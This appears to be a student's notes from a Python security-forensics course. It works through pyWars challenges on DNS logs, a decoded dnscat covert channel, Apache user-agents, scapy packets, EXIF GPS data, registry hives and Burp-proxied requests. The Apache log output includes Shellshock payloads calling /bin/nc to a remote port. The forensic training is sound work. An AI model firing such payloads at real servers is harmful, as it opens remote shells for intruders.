'01-Apr-2015 13:00:00.097 client 55.120.153.247#55982: query: docs.google.com IN NS + ((8.8.8.8))\n01-Apr-2015 13:00:00.25'

>>> re.findall(r"client ([\d.]{7,15}).*?query: (\S+) IN", _ )
[('55.120.153.247', 'docs.google.com')]

>>> client_host_pairs = re.findall(r"client ([\d.]{7,15}).*?query: (\S+) IN", logfile)
>>> client_host_pairs[:2]
[('55.120.153.247', 'docs.google.com'), ('49.220.209.195', 'image-store.slidesharecdn.com')]

>>> def doanswer56(logtuple):
...     logname, hostname = logtuple
...     fpath = pathlib.Path("/home/student/Public/log/dnslogs") / logname
...     logfile = fpath.read_text()
...     client_host_pairs = re.findall(r"client ([\d.]{7,15}).*?query: (\S+) IN", logfile)
...     return sorted([ip for ip, host in client_host_pairs if host == hostname])
... 
>>> doanswer56(x)
['114.241.201.224', '14.74.213.34', '141.240.95.116', '156.225.23.217', '165.9.122.100', '170.48.68.63', '175.109.254.83', '192.57.63.222', '199.187.208.169', '211.123.75.5', '214.251.144.134', '222.168.183.220', '224.205.158.216', '228.100.74.149', '231.101.236.133', '24.82.125.105', '241.12.72.22', '253.153.52.223', '28.242.250.238', '30.111.131.107', '30.211.105.219', '4.11.205.194', '43.221.17.93', '45.48.15.164', '56.64.104.99', '62.102.33.54', '69.171.229.12', '74.163.158.115', '79.152.78.155', '8.176.105.112', '84.216.59.34', '93.165.53.61', '97.69.42.116', '99.177.211.84']

>>> d.answer(56, doanswer56(d.data(56)))
'Correct'
```

```python
>>> d.question(57)
'The data() contains a tuple with two values. It contains a filename of a BIND DNS log and a target length. Open the file specified from the /home/student/Public/log/dnslogs directory. Submit the number of hostnames that have a length greater than the target length.'
>>> x = d.data(57)
>>> x
('15.log', 60)

logfile, tgt_len = d.data(57)
>>> log_content = pathlib.Path("/home/student/Public/log/dnslogs/" + logfile).read_text()
>>> log_content[:100]
'01-Apr-2015 15:00:00.205 client 197.65.31.4#53316: query: www.google.com IN A + ((8.8.8.8))\n01-Apr-2'

hostnames = re.findall(r"query: (.*?) IN", log_content)
>>> hostnames[:4]
['www.google.com', 'plus.google.com', 'www.sans.org', 'connect.facebook.net']

>>> long_hosts = []
>>> for each_host in hostnames:
...     if len(each_host) > tgt_len:
...             long_hosts.append(each_host)

>>> len(long_hosts)
4227

>>> def doanswer57(thedata):
...     log_file, tgt_len = thedata
...     file_content = pathlib.Path(r"/home/student/Public/log/dnslogs/" + log_file).read_text()
...     all_hosts = re.findall(r"query: (.*?) IN", file_content)
...     answer = []
...     for each_host in all_hosts:
...             if len(each_host) > tgt_len:
...                     answer.append(each_host)
...     return len(answer)

>>> d.answer(57, doanswer57(d.data(57)))
'Correct'

>>> doanswer57(("10.log",70))
72
>>> doanswer57(("11.log",70))
305
>>> doanswer57(("12.log",70))
39
>>> doanswer57(("13.log",70))
85
>>> doanswer57(("14.log",70))
38
>>> doanswer57(("15.log",70))
4223

>>> lpath = pathlib.Path("/home/student/Public/log/dnslogs/15.log")
>>> file_content = lpath.read_text()
>>> longhosts = re.findall(r"query: (\S{70,}) IN", file_content)
>>> longhosts[0]
'4608.01.4238.5161.4253.4d6963726f736f66742057696e646f.7773205b56657273696f6e20362e33.2e393630305d0d0a28632920323031.33204d6963726f736f667420436f72.706f726174696f6e2e20416c6c2072.69676874732072657365727665642e.0d0a0d0a433a5c5573.lookup.myokdomain.com'

>>> longhosts[0].split(".")[5:-3]
['4d6963726f736f66742057696e646f', '7773205b56657273696f6e20362e33', '2e393630305d0d0a28632920323031', '33204d6963726f736f667420436f72', '706f726174696f6e2e20416c6c2072', '69676874732072657365727665642e', '0d0a0d0a433a5c5573']

>>> "".join(longhosts[0].split(".")[5:-3])
'4d6963726f736f66742057696e646f7773205b56657273696f6e20362e332e393630305d0d0a2863292032303133204d6963726f736f667420436f72706f726174696f6e2e20416c6c207269676874732072657365727665642e0d0a0d0a433a5c5573'

>>> import codecs
>>> codecs.decode("".join(longhosts[0].split(".")[5:-3]), "hex")
b'Microsoft Windows [Version 6.3.9600]\r\n(c) 2013 Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Us'

>>> def dnscat_decode(host):
...     return codecs.decode("".join(host.split(".")[5:-3]), "hex")

>>> print(b"".join(map(dnscat_decode, longhosts)).decode())

C:\UsMicrosoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
Directory of C:\Users\mark
07/14/2015  01:25 PM    <DIR>          .
07/14/2015  01:25 PM    <DIR>          ..
```

```python
"Submit a list of all of the host from the data() that have a freq 'letter probability' which is less than that one."
>>> d.data(58)
['sourceforge.net', 's0.2mdn.net', 'p.pfx.ms', 'd2gon4a28k2gjc.cloudfront.net', 'ibmsmarteritservices.sourceforge.net', 'services.addons.mozilla.org', 'www.7-zip.org', <truncated>]

>>> import sys
>>> sys.path.append(r"/home/student/Public/Modules/freq")
>>> from freq import FreqCounter
>>> fc = FreqCounter()
>>> fc.load(r"/home/student/Public/Modules/freq/freqtable2018.freq")
>>> fc.probability("google.com")
(6.6009, 5.0887)
>>> fc.probability("lj23oxkg")
(0.8147, 0.116)

>>> list(map(fc.probability, d.data(58)))
[(7.6244, 5.6808), (1.7321, 2.5535), (0.7624, 0.8382), <truncated>]

>>> answer = []
>>> for eachhost in d.data(58):
...     if fc.probability(eachhost)[0] < 1:
...             answer.append(eachhost)

>>> answer
['p.pfx.ms', 'a.gfx.ms', 'www.nfl.biz']

>>> def low_probability(thedata):
...     answer = []
...     for eachhost in d.data(58):
...             if fc.probability(eachhost)[0] < 1:
...                     answer.append(eachhost)
...     return answer

>>> low_probability(d.data(58))
['p.pfx.ms', 'a.gfx.ms', 'www.nfl.biz']

>>> d.answer(58, low_probability(d.data(58)))
'Correct'
```

```python
>>> d.question(59)
'The data() contains a client IP address.   Parse all of the DNS log files in /home/student/Public/log/dnslogs and return a sorted list of all the hostnames that were queried by that client.  Do not eliminate duplicates.'
>>> x = d.data(59)
>>> x
'153.56.176.29'

>>> def doanswer59(clientip):
...     answer = []
...     dns_logs = pathlib.Path("/home/student/Public/log/dnslogs")
...     for file_name in dns_logs.glob("*"):
...             file_text = file_name.read_text()
...             regex = r"client %s.*?query: (\S+) IN" % (clientip)
...             answer.extend(re.findall(regex, file_text))
...     return sorted(answer)

>>> doanswer59(x)
['afs.moatads.com']

>>> d.answer(59, doanswer59(d.data(59)))
'Correct'
```

```python
>>> d.question(60)
'Find the nth most frequently occurring User-Agent String in the log file /home/student/Public/log/apache2/access.log where n is the integer returned by the data method.'
>>> d.data(60)
1

>>> fpath = pathlib.Path("/home/student/Public/log/apache2/access.log")
>>> logfile = fpath.read_text()

>>> logfile[:150]
'192.168.90.170 - - [08/Oct/2014:03:51:58 -0400] "GET / HTTP/1.1" 200 483 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Geck'

# Example line in logfile:
192.168.90.170 - - [08/Oct/2014:05:06:26 -0400] "GET /css/style.css HTTP/1.1" 304 209 "http://10.10.73.150/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36"

>>> from collections import Counter
>>> c = Counter()
>>> regex = r'[\d.]+.*?\[.*?\] ".*?" \d+ \d+ ".*?" "(.*?)"'
>>> c.update(re.findall(regex, logfile))
>>> c.most_common(10)
[('Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36', 204), ('Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140903 Firefox/24.0 Iceweasel/24.8.0', 35), ('curl/7.26.0', 5), ('Apache/2.2.22 (Ubuntu) (internal dummy connection)', 3), ('() { :; }; /bin/nc 192.168.90.11 4444', 2), ('() { :; }; /bin/ping 192.168.90.11', 1)]

# Ooopsie Doopsy!
('() { :; }; /bin/nc   192.168.90.11 4444', 2)

>>> d.answer(60, c.most_common(10)[int(d.data(60))-1][0])
'Correct'
```

**Conclusions:**

In this lab, we worked with log files to do the following:

- Read DNS logs to find which hosts queried a particular hostname
- Find a DNSCAT command and control channel based on long hostname
- Find a c2 hostname based on the frequency score
- Find every host that a specific IP address queried
- Extract User-Agent strings from apache http logs to find the most common

### Exercise 3.4: pyWars Packet Analysis

- [x] 

**Objectives:**
- pyWars challenges 62–65 are packet analysis challenges
- You will not complete all of these during the time provided
- If you are brand new to Python, choose one or two challenges

```python
>>> from scapy.all import *
>>> d.question(62)
"The data() method will return a string that you must convert to a scapy packet by calling 'somevar = Ether(.data())'.   Then extract the TCP Sequence number and submit it as the answer."
>>> x = d.data(62)
>>> x
b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00\x15K\x00D\xda\x86`\x00\xb8\x06\xf9\xdf\x7f\x00\x00\x01\x7f\x00\x00\x01\x02E\xc6\x7f\x99\xae\xc8j\x95\xdflZ\xcc0\xaf\x07\x8d\t\xb8\xfe\x05\x02"\n\xa3\xefQ|\x85\xc1\xd0\xf5\x0f\x02\x01"\n\x15pH\xa2NPn#\x00\x00\x00'

>>> somevar = Ether(d.data(62))
>>> somevar
<Ether  dst=ff:ff:ff:ff:ff:ff src=00:00:00:00:00:00 type=0x800 |<IP  version=1 ihl=5 tos=0x4b len=68 id=55942 flags=MF+DF frag=0 ttl=184 proto=tcp chksum=0xf9df src=127.0.0.1 dst=127.0.0.1 |<TCP  sport=581 dport=50815 seq=2578368618 ack=2514447450 dataofs=12 reserved=6 flags=AU window=44807 chksum=0x8d09 urgptr=47358 options=[('SAck', ()), ('TFO', (2750370172, 2244071669)), ('AltChkSumOpt', b''), ('NOP', None), ('TFO', (359680162, 1313893923)), ('EOL', None)] |>>>

>>> somevar[TCP].seq
2578368618

>>> def doanswer62(thedata):
...     pkts = Ether(thedata)
...     return pkts[TCP].seq

>>> doanswer62(d.data(62))
2578368618

>>> d.answer(62, doanswer62(d.data(62)))
'Correct'
```

```python
>>> d.question(63)
"The data() method will return a string that you must convert to a scapy packet by calling 'somevar = Ether(.data())'.   Submit the payload of the packet."
>>> x = d.data(63)
>>> x
b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x005\x9c\x00L\x96\xb5 \x00\xa5\x06pX\x7f\x00\x00\x01\x7f\x00\x00\x01e\xb5hU6\xc3~A\xf5\r\xf6\xe0~21T\rz\xafI\x0e\x05mf\xc0\x03\x03}nudge nudge wink wink5368514'

>>> somevar = Ether(d.data(63))
>>> somevar.load
b'nudge nudge wink wink5368514'

>>> somevar[Raw].load
b'nudge nudge wink wink5368514'

>>> d.answer(63, Ether(d.data(63))[Raw].load)
'Correct'
```

```python
>>> d.question(64)
"The data() method will return a list of strings that you must convert to a scapy PacketList by calling 'somevar = scapy.plist.PacketList([Ether(x) for x in .data()])'.   Then extract the flag that is embedded in the ICMP payloads and submit it as a string."
>>> x = d.data(64)
>>> x
[b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01r", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01h", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01i", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01n", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01o", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01-", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01r", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01o", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01c", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01k", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x01s", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x011", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x011", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x015", b"\x00\r\xb9'\x07\x80\x00\x0c)%l\x15\x08\x00E\x00\x00T\x9a'@\x00@\x01\x84\xe5\n\x01\x01\x8c\x08\x08\x08\x08\x08\x00\xcf\xd4qz\x00\x013"]

>>> pkts = scapy.plist.PacketList([Ether(x) for x in d.data(64)])
>>> pkts
<PacketList: TCP:0 UDP:0 ICMP:15 Other:0>

>>> pkts[0]
<Ether  dst=00:0d:b9:27:07:80 src=00:0c:29:25:6c:15 type=0x800 |<IP  version=4 ihl=5 tos=0x0 len=84 id=39463 flags=DF frag=0 ttl=64 proto=icmp chksum=0x84e5 src=10.1.1.140 dst=8.8.8.8 |<ICMP  type=echo-request code=0 chksum=0xcfd4 id=0x717a seq=0x1 |<Raw  load='r' |>>>>

>>> pkts[0][Raw].load
b'r'

>>> def doanswer64(inlist):
...     pkts = scapy.plist.PacketList([Ether(x) for x in inlist])
...     return b"".join([x[Raw].load for x in pkts]).decode()

>>> doanswer64(d.data(64))
'rhino-rocks1153'

>>> d.answer(64, doanswer84(d.data(64)))
'Correct'
```

```python
>>> d.question(65)
'Read /home/student/Public/packets/web.pcap  Commands are embedded in the packet payloads between the tags <command> and </command>.  The .data() method will give you a command number.  Submit that command as a string as the answer.  For example if .data() is a 5 you submit the 5th command that was transmitted.  Ignore blank commands (ie <command></command>).'
d.data(65)
13

>>> pkts = rdpcap("/home/student/Public/packets/web.pcap")
>>> allpayloads = b"".join([x[Raw].load for x in pkts if x.haslayer(Raw)])

>>> allpayloads.index(b"<command>")
233756

>>> allpayloads[233750:233800]
b'lient><command></command><sessionid></sessionid><v'

>>> allpayloads.replace(b"<command>", b"XXXXXXXXX", 1).index(b"<command>")
236239
>>> allpayloads[236239:236300]
b'<command>turn%20on%20light</command><sessionid>Rk9STQAAAPZJRl'

>>> cmds = re.findall(b"<command>(.+?)</command>", allpayloads)
>>> cmds[0]
b'turn%20on%20light'

>>> d.answer(65, cmds[d.data(65)-1].decode())
'Correct'
```

**Conclusions:**

We worked with pyWars challenges 62–65 to focus on working with and analyzing packets

- You can now extract TCP sequence numbers
- Convert RAW data into a scapy packet
- Extract a payload from ICMP packets
- Extract information from web traffic

### Exercise 4.1: Parsing Data Structures

- [x] 

**Objectives:**
- Write a network forensics artifact parser—that is, a sniffer!
- Complete the ICMP parser for the sniffer

```text
cd /home/student/Documents/pythonclass/apps/
gedit sniff.py &
sudo su -
python sniff.py
```

```python
    elif embedded_protocol =="ICMP":
        #ICMP Header = Type 1 byte, Code 1 byte, checksum 2 bytes, data 4 bytes
        #If only someone would please write this!
        print("UNSUPPORTED PROTOCOL FOUND: ICMP")
        pass
```

### Exercise 4.2: Image Forensics

- [x] 

**Objectives:**
- You will now complete an image‐forensics challenge to illustrate just how easy libraries like PIL make accessing known data types like JPG ~/Public/images/ contains two subdirectories:
	- sans‐images: images from the SANS website with no GPS EXIF data
	- icanstalku‐images: images from icanstalku.com with GPS info
- You will be completing image-forensics.py, which is sitting in the apps directory

```text
cd /home/student/Documents/pythonclass/apps/
gedit image-forensics.py &

python image-forensics.py  --help
usage: image-forensics.py [-h] [-d] [-m] [-e] [-p] image_directory

positional arguments:
  image_directory  A file path containing images to process

optional arguments:
  -h, --help       show this help message and exit
  -d, --display    Display the image
  -m, --maps       Print google maps links
  -e, --exif       Display the exif data
  -p, --pause      Pause after each image
```

```bash
python image-forensics.py -d /home/student/Public/images/sans-images/

[*] Processing file /home/student/Public/images/sans-images/28.jpg 
Displaying images has not been written yet.
```

```text
python image-forensics.py -mep /home/student/Public/images/icanstalku-images/

[*] Processing file /home/student/Public/images/icanstalku-images/28.jpg 
Press enter to continue

[*] Processing file /home/student/Public/images/icanstalku-images/14.jpg 
TAG:34853 (GPSInfo) is assigned {0: b'\x02\x02\x00\x00', 1: 'N', 2: ((33, 1), (39, 1), (35, 1)), 3: 'E', 4: ((135, 1), (21, 1), (50, 1)), 14: 'T', 15: (0, 1), 18: 'WGS-84', 27: b'ASCII\x00\x00\x00GPS-FIX'}
TAG:296 (ResolutionUnit) is assigned 2
TAG:34665 (ExifOffset) is assigned 209
TAG:270 (ImageDescription) is assigned DSC_0193
TAG:271 (Make) is assigned SHARP
TAG:272 (Model) is assigned INFOBAR A01
TAG:306 (DateTime) is assigned 2011:10:08 14:55:04
TAG:531 (YCbCrPositioning) is assigned 1
TAG:274 (Orientation) is assigned 1
TAG:282 (XResolution) is assigned (72, 1)
TAG:283 (YResolution) is assigned (72, 1)
TAG:36864 (ExifVersion) is assigned b'0230'
TAG:37121 (ComponentsConfiguration) is assigned b'\x01\x02\x03\x00'
TAG:37377 (ShutterSpeedValue) is assigned (758069, 65536)
TAG:36867 (DateTimeOriginal) is assigned 2011:10:08 14:55:04
TAG:36868 (DateTimeDigitized) is assigned 2011:10:08 14:55:04
TAG:37378 (ApertureValue) is assigned (165548, 65536)
TAG:37379 (BrightnessValue) is assigned (617631, 65536)
TAG:37380 (ExposureBiasValue) is assigned (18971, 65536)
TAG:37381 (MaxApertureValue) is assigned (253, 100)
TAG:37383 (MeteringMode) is assigned 2
TAG:37385 (Flash) is assigned 16
TAG:37386 (FocalLength) is assigned (408, 100)
TAG:40961 (ColorSpace) is assigned 1
TAG:40962 (ExifImageWidth) is assigned 480
TAG:40965 (ExifInteroperabilityOffset) is assigned 675
TAG:41990 (SceneCaptureType) is assigned 0
TAG:40963 (ExifImageHeight) is assigned 640
TAG:41993 (Saturation) is assigned 0
TAG:41996 (SubjectDistanceRange) is assigned 0
TAG:33434 (ExposureTime) is assigned (7, 20000)
TAG:33437 (FNumber) is assigned (24, 10)
TAG:41985 (CustomRendered) is assigned 0
TAG:34855 (ISOSpeedRatings) is assigned 100
TAG:41986 (ExposureMode) is assigned 1
TAG:40960 (FlashPixVersion) is assigned b'0100'
TAG:41987 (WhiteBalance) is assigned 0
TAG:41988 (DigitalZoomRatio) is assigned (10, 10)
TAG:41989 (FocalLengthIn35mmFilm) is assigned 31
TAG:41991 (GainControl) is assigned 0
http://maps.google.com/maps?q=33.659722222,135.363888889&z=15
Press enter to continue^CTraceback (most recent call last):
  File "image-forensics.py", line 94, in <module>
    x = input("Press enter to continue")
```

```python
    if args.display: 
        #Resize the image to 200x200 and display it
        #This section currently does NOTHING. Complete this section of code.
        print("Displaying images has not been written yet.")
```

- Complete the portion of the program that executes when -d or --display is passed as an argument
-  New to programming? Here is your challenge:
	- Use resize() to resize the image to 200x200 using the antialiasing method
	- Display the image on the screen
- Advanced programmers can challenge themselves
	- Use resize()and the .size attribute to resize the image to an approximate width of 200; adjust the height to maintain the aspect ratio of the image
- Python Ninja?
	- Write your own "print_exif()" function

**Basic:**

```python
    if args.display: 
		#Resize the image to 200x200 and display it
		newimage = imageobject.resize((200, 200), Image.ANTIALIAS)
		newimage.show()
```

**Advanced:**

```python
    if args.display: 
		chng = 200.0 / imageobject.size[0]
		newsize = (int(imageobject.size[0]*chng), int(imageobject.size[1]*chng))
		newimage = imageobject.resize(newsize, Image.ANTIALIAS)
		newimage.show() 
```

### Exercise 4.3: pyWars Registry Forensics

- [x] 

**Objectives:**
- pyWars challenges 67–70 are registry‐based challenges
- You will not complete all of these during the time provided
- If you are brand new to Python, choose one or two challenges

```python
>>> from Registry.Registry import Registry
>>> d.question(67)
'Open the SOFTWARE registry file stored in the /home/student/Public/registry directory. The .data() contains the name of a value in the key Microsoft\\Windows NT\\CurrentVersion\\Winlogon.  Submit its value'
>>> d.data(67)
'ShutdownStartTime'

>>> rh = Registry("/home/student/Public/registry/SOFTWARE")
>>> rk = rh.open(r"Microsoft\Windows NT\CurrentVersion\Winlogon")

>>> rv = rk.value("ShutdownStartTime")
>>> rv
<Registry.Registry.RegistryValue object at 0x7f0ff9dd1898>

>>> rv.name(), rv.value(), rv.value_type_str()
('ShutdownStartTime', 131119717638508921, 'RegQWord')

>>> def doanswer67(datasample):
...     rh = Registry("/home/student/Public/registry/SOFTWARE")
...     rk = rh.open(r"Microsoft\Windows NT\CurrentVersion\Winlogon")
...     return rk.value(datasample).value()

>>> d.answer(67, doanswer67(d.data(67)))
'Correct'
```

```python
'Open the SOFTWARE registry file stored in the /home/student/Public/registry directory.  Build a sorted list of subkeys names at the root of this file. What is the name of the key in position .data()? '
>>> d.data(68)
15

>>> rh = Registry("/home/student/Public/registry/SOFTWARE")
>>> rk = rh.open("")
>>> rk = rh.root()

>>> list(map(lambda x: x.name(), rk.subkeys()[:3]))
['7-Zip', 'Apple Computer, Inc.', 'Apple Inc.']

>>> def get_name(akey):
...     return akey.name()

>>> list(map(get_name, rk.subkeys()[:3]))
['7-Zip', 'Apple Computer, Inc.', 'Apple Inc.']

>>> list(map(lambda x: x.path(), rk.subkeys()[:3]))
['ROOT\\7-Zip', 'ROOT\\Apple Computer, Inc.', 'ROOT\\Apple Inc.']

>>> doanswer68(d.data(68))
'Policies'

>>> d.answer(68, doanswer68(d.data(68)))
'Correct'
```

```python
>>> d.question(69)
'Open the SOFTWARE registry file stored in the /home/student/Public/registry directory. Ignoring case, submit a sorted list of all of the wireless SSIDs (FirstNetwork) in the Unmanaged network profile that begin with the letter in .data()'
d.data(69)
't'

>>> rh = Registry("/home/student/Public/registry/SOFTWARE")
>>> rk = rh.open(r"Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged")

>>> ssids = list(map(lambda x: x.value("FirstNetwork").value(), rk.subkeys()))
>>> ssids
['Admirals_Club  6', 'ATL Free Wi-Fi  2', 'Marriott_GUEST', 'SEATAC-FREE-WIFI', 'NACSpot', 'HootWifi', 'attwifi  4', 'FFX-VW-VOLVO-CUSTOMER', 'TWCWiFi', 'attwifi  3', 'ATL Free Wi-Fi  3', 'Microsoft Store', 'Otopeni Airport', 'ResidenceInn_GUEST  2', 'Starbucks WiFi', 'ATL Free Wi-Fi', 'Hotel Guest', 'IHS-Guest', 'phoenix 5GHz', 'mcguest', 'starklabs', 'Boingo Hotspot', 'HolidayInnCharleston', 'ResidenceInn-Guest', 'WMeetingroom', 'ResidenceInn_Guest', 'PANERA', 'Fairfax_Corner_Free_WiFi', 'Admirals_Club  3', 'hhonors', 'Gold Ballroom', 'Intercontinental', 'TWCWiFi  2', 'snap', 'GrandWailea  2', 'optimumwifi', 'hhonors  2', 'TWCWiFi  3', 'Admirals_Club', 'Hyatt Guestroom', 'ISBA Annual Meeting', 'IHOP_GUEST', 'snapSW', 'TWCWiFi  4', 'phoenix', 'gogoinflight', 'PSAV_Event_Solutions', 'GrandWailea', 'CoxWiFi', 'CU Denver Guest', 'Admirals_Club  5', 'CFW-guest', 'WirelessViennaAirport', 'NACSpot  2', 'SNAPSE5  2', 'Reagan National WiFi', 'Hyatt Lobby', 'WholeFoodsMarket', 'gogoinflight  2', 'TheCenturionLounge', 'Marriott_GUEST  2', 'CHSFREEWIFI', 'Admirals_Club  4', 'PartyCity-Free-WiFi', "Maddy's Tap Room's Wi-Fi Network", 'Fly With Ease . . .', 'Courtyard_GUEST', 'NSA_Collector_64', 'hhonors  3', 'SNAPSE5', 'REGUSNETWIFI', 'WholeFoodsMarket  2', 'StarkSat', 'IHGConnect', '@Hyatt_WiFi', 'attwifi  2', 'Francis Marion Meeting', 'snap  2', 'attwifi', 'Admirals_Club  2', 'WLivingRoom', 'starklabs5GHz2', 'attwifi  5', 'starklabs5GHz', '@Hyatt_WiFi  2']

>>> [x for x in ssids if x.lower().startswith('w')]
['WMeetingroom', 'WirelessViennaAirport', 'WholeFoodsMarket', 'WholeFoodsMarket  2', 'WLivingRoom']

>>> def doanswer69(datasample):
...     rh = Registry("/home/student/Public/registry/SOFTWARE")
...     rk = rh.open(r"Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged")
...     ssids = list(map(lambda x: x.value("FirstNetwork").value(), rk.subkeys()))
...     return sorted([x for x in ssids if x.lower().startswith(datasample)])

>>> doanswer69(d.data(69))
['TWCWiFi', 'TWCWiFi  2', 'TWCWiFi  3', 'TWCWiFi  4', 'TheCenturionLounge']

>>> d.answer(69, doanswer69(d.data(69)))
'Correct'
```

```python
>>> d.question(70)
'Open the NTUSER.DAT registry file stored in the /home/student/Public/registry directory.  Submit the sum of all the values in the key specified in .data()'
>>> x = d.data(70)
>>> x
'ROOT\\SOFTWARE\\REGLAB\\Software\\Run\\Service'

>>> rh = Registry("/home/student/Public/registry/NTUSER.DAT")
>>> rk = rh.open(x)
Traceback (most recent call last):
  File "/usr/lib/python3.6/code.py", line 91, in runcode
    exec(code, self.locals)
  File "<console>", line 1, in <module>
  File "/home/student/.local/lib/python3.6/site-packages/Registry/Registry.py", line 352, in open
    return RegistryKey(self._regf.first_key()).find_key(path)
  File "/home/student/.local/lib/python3.6/site-packages/Registry/Registry.py", line 277, in find_key
    return self.subkey(immediate).find_key(future)
  File "/home/student/.local/lib/python3.6/site-packages/Registry/Registry.py", line 242, in subkey
    raise RegistryKeyNotFoundException(self.path() + "\\" + name)
Registry.Registry.RegistryKeyNotFoundException: Registry key not found: ROOT\ROOT

>>> rk = rh.open(x[5:])

>>> list(map(lambda x: (x.name(), x.value()), rk.values()))
[('CurrentVersion', '17562'), ('Run', '85721'), ('Program', '63572')]

>>> list(map(lambda x: int(x.value()), rk.values()))
[17562, 85721, 63572]

>>> sum(list(map(lambda x: int(x.value()), rk.values())))
166855

>>> def doanswer70(datasample):
...     rh = Registry("/home/student/Public/registry/NTUSER.DAT")
...     rk = rh.open(x[5:])
...     return sum(list(map(lambda x: int(x.value()), rk.values())))

>>> d.answer(70, doanswer70(d.data(70)))
'Correct'
```

**Conclusions:**

These challenges focused on working with the Windows registry to:

- List subkeys
- Extract a particular key's value
- Extract wireless SSIDs from a registry hive

### Exercise 4.4: HTTP Communication

- [x] 

**Objectives:**
- Use Python to send requests through Burp Suite proxy
- Use Requests to interact with a webpage

		cd /opt/geofind
		python3 ./web.py

```text
 * Serving Flask app "web" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:5730/ (Press CTRL+C to quit)
```

	firefox http://127.0.0.1:5730/	Login: apiusername:apipassword

```text
00:00:00:dd:dd:dd	// (41.57791138, -109.25166321)
aa:bb:cc:dd:ee:ff	// (40.58861542, -50.79531097)
00:00:5e:00:01:1b	// (41.88912582, -87.63746643)
DE:AD:B3:3F:13:37	// NOT FOUND

// Click Log In
// Right-click near login box and view source
```

```html
<div class="jumbotron">
        <h1>Geolocation Finder</h1>
        <form class="form-signin" method="POST" action="/login">
        <label for="inputName" class="sr-only">Name</label>
        <input type="name" autocomplete="off" name="inputName" id="inputName" class="form-control" placeholder="Username" required autofocus>
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password"  autocomplete="off" name="inputPassword" id="inputPassword" class="form-control" placeholder="Password" required>
        <button id="btnSignIn" class="btn btn-lg btn-primary btn-block" type="submit">Sign In</button>
       </div>
```

	sudo su -
	cd /opt/burp/
	java -jar burpsuite_community_v1.7.36.jar 

Turn off Proxy=>Intercept


	cd Documents/pythonclass/apps/
	gedit geofind-through-burp-exercise.txt &

```python
import requests
browser = requests.session()
browser.proxies['http'] = 'http://127.0.0.1:8080'
postdata = {'inputName':'hacker','inputPassword':'letmein'}
response = browser.post('http://127.0.0.1:5730/login', postdata, allow_redirects = False)
print("RESPONSE: ", response.status_code, response.reason)
print("SERVER HEADERS", response.headers)
print("COOKIES:  ",browser.cookies.items())
#STOP DONT COPY ALL OF IT!  Now examine the request/response in burp.

postdata = {'inputName':'hacker','inputPassword':'letmein'}
response = browser.post('http://127.0.0.1:5730/login', postdata)
print("RESPONSE: ", response.status_code, response.reason)
